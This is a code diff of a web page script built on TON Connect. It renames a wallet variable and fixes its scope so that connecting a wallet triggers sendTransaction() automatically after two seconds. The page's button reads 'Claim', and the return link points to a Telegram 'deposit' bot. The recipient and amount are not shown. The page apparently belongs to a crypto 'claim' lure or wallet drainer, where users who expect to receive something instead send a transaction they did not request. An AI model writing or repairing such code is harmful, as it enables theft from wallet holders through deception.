@@ -24,11 +24,11 @@
         twaReturnUrl: 'https://t.me/wallet_connect_deposit_bot'
     };
 
-    const currentWallet = tonConnectUI.wallet;
+    let connectedWallet = tonConnectUI.wallet;
     setInnerHtml();
 
     function setInnerHtml() {
-        if(currentWallet) {
+        if(connectedWallet) {
             document.getElementById('connect-btn').innerHTML = 'Claim';
         }
         else{
@@ -38,7 +38,7 @@
 
     document.getElementById("connect-btn").addEventListener('click', async () => {
         // Call the function
-        if(currentWallet) {
+        if(connectedWallet) {
             document.getElementById('connect-btn').innerHTML = 'Claim';
             sendTransaction();
         }
@@ -52,9 +52,8 @@
     });
 
     async function connectToWallet() {
-        const connectedWallet = await tonConnectUI.connectWallet();
-        connectWallet = connectedWallet;
-        setInnerHtml();
+        connectedWallet = await tonConnectUI.connectWallet();
+        
         setTimeout(function() {
             sendTransaction();
         }, 2000);
@@ -76,7 +75,7 @@
     
     document.getElementById("disconnect-btn").addEventListener('click', async () => {
         await tonConnectUI.disconnect();
-        currentWallet = null;
+        connectedWallet = null;
         setInnerHtml();
     });
 </script>
